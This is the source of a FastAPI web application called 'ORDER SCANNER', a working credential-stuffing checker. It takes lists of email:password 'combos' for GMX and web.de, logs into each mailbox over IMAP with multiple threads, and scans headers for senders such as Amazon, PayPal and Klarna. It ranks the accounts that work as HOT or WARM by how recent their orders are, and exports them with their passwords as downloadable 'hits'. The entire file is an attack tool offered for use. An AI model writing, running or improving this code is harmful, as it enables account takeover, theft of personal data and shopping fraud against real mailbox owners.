from fastapi import FastAPI
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel
import imaplib, email, threading, concurrent.futures, socket, json
from datetime import datetime, timezone
from typing import List

app = FastAPI()

PROVIDER_MAP = {
    "gmx.de":("imap.gmx.net",993),"gmx.net":("imap.gmx.net",993),
    "gmx.at":("imap.gmx.net",993),"gmx.ch":("imap.gmx.net",993),
    "web.de":("imap.web.de",993),
}

SHOPS = {
    "amazon":"Amazon","lieferando":"Lieferando","zalando":"Zalando","payback":"Payback",
    "airbnb":"Airbnb","booking.com":"Booking","ebay":"eBay","otto":"Otto","rewe":"REWE",
    "lidl":"Lidl","aldi":"Aldi","kaufland":"Kaufland","mediamarkt":"MediaMarkt",
    "saturn":"Saturn","ikea":"IKEA","baur":"Baur","aboutyou":"AboutYou",
    "bestsecret":"Bestsecret","peek":"Peek&Cloppenburg","shopapotheke":"ShopApotheke",
    "flixbus":"FlixBus","bahn":"Bahn","lufthansa":"Lufthansa","eventim":"Eventim",
    "netflix":"Netflix","spotify":"Spotify","paypal":"PayPal","klarna":"Klarna",
    "kleinanzeigen":"Kleinanzeigen","dhl":"DHL","hermes":"Hermes","dpd":"DPD",
    "noreply":"NoReply","no-reply":"NoReply","donotreply":"NoReply",
    "newsletter":"Newsletter","versand":"Versand","order":"Order",
    "zara":"Zara","hm.com":"H&M","deichmann":"Deichmann","tchibo":"Tchibo",
    "dm.de":"DM","rossmann":"Rossmann","douglas":"Douglas","adidas":"Adidas","nike":"Nike",
}

def days_ago(ds):
    try:
        from email.utils import parsedate_to_datetime
        dt=parsedate_to_datetime(ds)
        if dt.tzinfo is None: dt=dt.replace(tzinfo=timezone.utc)
        return (datetime.now(timezone.utc)-dt).days
    except: return 9999

def classify(d):
    if d<=30: return "HOT","🔥"
    if d<=180: return "WARM","🌤"
    return "COLD","❄"

def check(line):
    line=line.strip()
    if not line or ":" not in line: return None
    idx=line.index(":")
    ea=line[:idx].strip().lower(); pw=line[idx+1:].strip()
    if "@" not in ea or not pw: return None
    domain=ea.split("@")[1]
    if domain not in PROVIDER_MAP: return {"type":"skip","email":ea}
    host,port=PROVIDER_MAP[domain]
    try:
        conn=imaplib.IMAP4_SSL(host,port,timeout=20)
        conn.login(ea,pw)
        sh={}; nd={}
        _,mbs=conn.list()
        folders=[]
        for mb in (mbs or []):
            if not mb: continue
            try:
                s=mb.decode() if isinstance(mb,bytes) else mb
                p=s.split('"'); f=p[-2] if len(p)>=3 else s.split()[-1].strip('"')
                folders.append(f)
            except: continue
        for f in folders:
            try:
                st,_=conn.select(f,readonly=True)
                if st!="OK": continue
                _,ids=conn.search(None,"ALL")
                if not ids[0]: continue
                for mid in ids[0].split()[-150:]:
                    try:
                        _,md=conn.fetch(mid,"(BODY.PEEK[HEADER.FIELDS (FROM SUBJECT DATE)])")
                        raw=md[0][1]
                        if not isinstance(raw,bytes): continue
                        msg=email.message_from_bytes(raw)
                        c=(msg.get("From","")+msg.get("Subject","")).lower()
                        d=days_ago(msg.get("Date",""))
                        for kw,shop in SHOPS.items():
                            if kw in c:
                                sh[shop]=sh.get(shop,0)+1
                                if shop not in nd or d<nd[shop]: nd[shop]=d
                    except: continue
            except: continue
        try: conn.logout()
        except: pass
        fil={s:{"count":c,"days":nd.get(s,9999),"temp":classify(nd.get(s,9999))[0],"icon":classify(nd.get(s,9999))[1]} for s,c in sh.items() if classify(nd.get(s,9999))[0]!="COLD"}
        if fil:
            md2=min(v["days"] for v in fil.values()); t,ic=classify(md2)
            return {"type":"hit","email":ea,"passw":pw,"shops":fil,"days":md2,"temp":t,"icon":ic}
        return {"type":"miss","email":ea}
    except imaplib.IMAP4.error: return {"type":"bad","email":ea}
    except (socket.timeout,TimeoutError): return {"type":"timeout","email":ea}
    except Exception as e: return {"type":"error","email":ea,"reason":str(e)[:50]}

class ScanRequest(BaseModel):
    combos: List[str]
    threads: int = 5

@app.post("/scan")
def scan(req: ScanRequest):
    threads = min(req.threads, 15)
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(check, c) for c in req.combos[:500]]
        for f in concurrent.futures.as_completed(futs):
            r = f.result()
            if r: results.append(r)
    return JSONResponse(content={"results": results})

HTML = r"""<!DOCTYPE html><html lang="de"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ORDER SCANNER</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{background:#0d0d0d;color:#e0e0e0;font-family:'Courier New',monospace;padding:14px;font-size:13px}
h1{color:#b060ff;text-align:center;font-size:20px;letter-spacing:4px;margin-bottom:2px}
.sub{text-align:center;color:#444;font-size:11px;margin-bottom:14px}
.legend{display:flex;gap:14px;justify-content:center;margin-bottom:14px;font-size:12px}
textarea{width:100%;height:100px;background:#111;border:1px solid #2a2a2a;color:#ccc;padding:10px;font-family:monospace;font-size:12px;border-radius:8px;resize:vertical;outline:none}
.hint{font-size:11px;color:#333;margin:4px 0 10px}
.controls{display:flex;gap:8px;align-items:center;margin-bottom:12px}
.thr-label{font-size:11px;color:#444;white-space:nowrap}
input[type=number]{width:55px;background:#111;border:1px solid #2a2a2a;color:#ccc;padding:7px;border-radius:6px;font-size:13px;text-align:center;outline:none}
#btn-start{flex:1;padding:11px;background:#b060ff;color:#fff;border:none;border-radius:8px;font-family:monospace;font-weight:bold;font-size:14px;cursor:pointer;letter-spacing:2px}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-bottom:10px}
.stat{background:#111;border:1px solid #1a1a1a;border-radius:8px;padding:8px 4px;text-align:center}
.stat-n{font-size:22px;font-weight:bold;line-height:1.1}
.stat-l{font-size:10px;color:#444;margin-top:2px}
.pg{background:#1a1a1a;border-radius:4px;height:5px;overflow:hidden;margin-bottom:4px}
.pb{height:5px;background:linear-gradient(90deg,#b060ff,#ff60aa);border-radius:4px;width:0%;transition:width .3s}
.pl{font-size:10px;color:#333;text-align:center;margin-bottom:10px}
#log{height:300px;overflow-y:auto;background:#080808;border:1px solid #1a1a1a;border-radius:8px;padding:10px;font-size:12px;line-height:1.8}
.lh{color:#44ff88}.lm{color:#ff4444}.ls{color:#2a2a2a}.lw{color:#ffaa00}.li{color:#00ccff}
.hits-box{background:#050f05;border:1px solid #1a3a1a;border-radius:8px;padding:12px;margin-top:12px;display:none}
.hits-title{color:#44ff88;font-weight:bold;margin-bottom:8px}
.hits-txt{font-size:11px;max-height:140px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;color:#888}
#btn-dl{width:100%;margin-top:8px;padding:9px;background:#0a1f0a;border:1px solid #1a4a1a;color:#44ff88;border-radius:6px;font-family:monospace;cursor:pointer;font-size:12px}
.batch-info{font-size:11px;color:#555;text-align:center;margin-bottom:8px}
</style></head><body>
<h1>▓ ORDER SCANNER ▓</h1>
<div class="sub">GMX & web.de — No-Reply Hunter</div>
<div class="legend"><span style="color:#ff4444">HOT 🔥 &lt;30d</span><span style="color:#ffaa00">WARM 🌤 &lt;180d</span><span style="color:#333">COLD ❄ hidden</span></div>
<textarea id="combos" placeholder="user@gmx.de:passwort123&#10;test@web.de:geheim456&#10;..."></textarea>
<div class="hint" id="hint">0 Combos geladen</div>
<div class="batch-info" id="batch-info"></div>
<div class="controls">
  <span class="thr-label">Threads</span>
  <input type="number" id="thr" value="10" min="1" max="15">
  <button id="btn-start" onclick="go()">▶ START</button>
</div>
<div class="stats">
  <div class="stat"><div class="stat-n" style="color:#44ff88" id="sh">0</div><div class="stat-l">HITS</div></div>
  <div class="stat"><div class="stat-n" style="color:#ff4444" id="sm">0</div><div class="stat-l">BAD</div></div>
  <div class="stat"><div class="stat-n" style="color:#ffaa00" id="ss">0</div><div class="stat-l">SKIP</div></div>
  <div class="stat"><div class="stat-n" style="color:#00ccff" id="st">0</div><div class="stat-l">TOTAL</div></div>
</div>
<div class="pg"><div class="pb" id="pb"></div></div>
<div class="pl" id="pl">0 / 0</div>
<div id="log"><span style="color:#222">Warte auf Start...</span></div>
<div class="hits-box" id="hbox">
  <div class="hits-title">📁 ORDER-HITS — <span id="hcount">0</span></div>
  <div class="hits-txt" id="htxt"></div>
  <button id="btn-dl" onclick="dl()">⬇ hits.txt herunterladen</button>
</div>
<script>
const BATCH=200;
let allCombos=[],hits=[],hc=0,mc=0,sc=0,tot=0,chk=0,running=false;
document.getElementById('combos').addEventListener('input',function(){
  const n=this.value.trim().split('\n').filter(l=>l.includes(':')).length;
  document.getElementById('hint').textContent=n+' Combos geladen';
  const batches=Math.ceil(n/BATCH);
  document.getElementById('batch-info').textContent=n>0?batches+' Batches à '+BATCH+' Combos':'';
});
function log(msg,cls){
  const el=document.getElementById('log');
  if(el.children.length===1&&el.firstChild.style&&el.firstChild.style.color==='rgb(34,34,34)')el.innerHTML='';
  const d=document.createElement('div');d.className=cls;d.textContent=msg;
  el.appendChild(d);if(el.children.length>600)el.removeChild(el.firstChild);
  el.scrollTop=el.scrollHeight;
}
function upd(){
  document.getElementById('sh').textContent=hc;
  document.getElementById('sm').textContent=mc;
  document.getElementById('ss').textContent=sc;
  document.getElementById('st').textContent=chk;
  const p=tot>0?Math.round(chk/tot*100):0;
  document.getElementById('pb').style.width=p+'%';
  document.getElementById('pl').textContent=chk+' / '+tot+' ('+p+'%)';
}
async function runBatch(batch,batchNum,totalBatches){
  const thr=parseInt(document.getElementById('thr').value)||10;
  log('[BATCH '+batchNum+'/'+totalBatches+'] '+batch.length+' Combos...','li');
  try{
    const res=await fetch('/scan',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({combos:batch,threads:thr})});
    const data=await res.json();
    for(const d of data.results){
      chk++;
      if(d.type==='hit'){
        hc++;
        const ss=Object.entries(d.shops).sort((a,b)=>b[1].count-a[1].count).map(([s,v])=>s+'('+v.count+')').join(', ');
        const tc=d.temp==='HOT'?'🔥 HOT ('+d.days+'d)':'🌤 WARM ('+d.days+'d)';
        log('[ORDER-HIT] '+d.email+' → '+ss+' | '+tc,'lh');
        hits.push(d.email+':'+d.passw+' → '+ss+' | '+d.temp+' '+d.icon+' ('+d.days+'d)');
      }else if(d.type==='bad'){mc++;log('[BAD]  '+d.email,'lm');
      }else if(d.type==='miss'){mc++;log('[MISS] '+d.email,'lm');
      }else if(d.type==='skip'){sc++;log('[SKIP] '+d.email,'ls');
      }else if(d.type==='timeout'){sc++;log('[TIMEOUT] '+d.email,'lw');
      }else if(d.type==='error'){sc++;log('[ERR]  '+d.email+' '+(d.reason||''),'lw');}
      upd();
    }
  }catch(e){log('[ERR] Batch '+batchNum+' fehlgeschlagen: '+e.message,'lw');}
}
async function go(){
  const lines=document.getElementById('combos').value.trim().split('\n').filter(l=>l.includes(':'));
  if(!lines.length){log('[ERROR] Keine Combos!','lw');return;}
  hits=[];hc=0;mc=0;sc=0;tot=lines.length;chk=0;
  document.getElementById('hbox').style.display='none';
  document.getElementById('log').innerHTML='';
  upd();running=true;
  document.getElementById('btn-start').disabled=true;
  document.getElementById('btn-start').textContent='⏳ LÄUFT...';
  const batches=[];
  for(let i=0;i<lines.length;i+=BATCH)batches.push(lines.slice(i,i+BATCH));
  log('[START] '+lines.length+' Combos | '+batches.length+' Batches','li');
  for(let i=0;i<batches.length;i++){
    if(!running)break;
    await runBatch(batches[i],i+1,batches.length);
  }
  log('━'.repeat(35),'ls');
  log('FERTIG — '+hc+' ORDER-HITS / '+chk+' gecheckt','li');
  running=false;
  document.getElementById('btn-start').disabled=false;
  document.getElementById('btn-start').textContent='▶ START';
  if(hits.length>0){
    document.getElementById('htxt').textContent='=== ORDER-HITS '+hc+'/'+tot+' ===\n'+hits.join('\n');
    document.getElementById('hcount').textContent=hc+' Hits';
    document.getElementById('hbox').style.display='block';
  }
}
function dl(){
  const c='=== ORDER-HITS '+hc+'/'+tot+' ===\nDatum: '+new Date().toLocaleString('de-DE')+'\n'+'─'.repeat(50)+'\n'+hits.join('\n');
  const b=new Blob([c],{type:'text/plain'});const u=URL.createObjectURL(b);
  const a=document.createElement('a');a.href=u;a.download='order_hits.txt';a.click();URL.revokeObjectURL(u);
}
</script></body></html>"""

@app.get("/", response_class=HTMLResponse)
async def index(): return HTML
